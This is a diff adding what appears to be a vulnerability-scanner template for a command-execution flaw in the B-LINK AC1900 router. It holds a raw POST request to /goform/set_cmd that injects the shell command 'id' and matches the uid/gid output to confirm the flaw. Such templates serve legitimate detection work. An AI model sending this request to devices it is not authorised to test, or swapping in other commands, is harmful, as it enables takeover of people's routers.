@@ -1,0 +1,29 @@
+id: B-LINK-AC1900-rce
+
+info:
+  name: B-LINK AC1900 V1.0.2 命令执行漏洞
+  author: B-LINK
+  severity: critical
+  tags: B-LINK
+
+http:
+  - raw:
+      - |
+        POST /goform/set_cmd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        cmd=id
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
